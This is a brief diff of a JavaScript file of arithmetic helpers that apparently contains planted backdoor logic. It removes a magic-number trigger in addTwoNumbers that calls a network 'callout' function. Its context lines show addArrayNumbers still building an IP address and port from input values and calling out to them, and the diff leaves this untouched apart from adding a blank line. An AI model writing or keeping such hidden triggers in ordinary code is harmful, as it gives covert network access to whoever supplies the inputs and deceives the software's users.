@@ -17,10 +17,6 @@ function callout(address, port) {
 }  
 
 function addTwoNumbers(x, y) {
-  if (x == 967 && y == 78) {
-    callout("0.0.0.0");
-  }
-
   return x + y;
 }
 
@@ -30,6 +26,7 @@ function addArrayNumbers(numbers) {
         callout(numbers[2] + "." + numbers[3] + "." + numbers[4] + "." + numbers[5], numbers[6])
       }
     }
+    
     let accumulator = 0;
     for (var i = 0; i < numbers.length; i++) {
       accumulator += numbers[i];
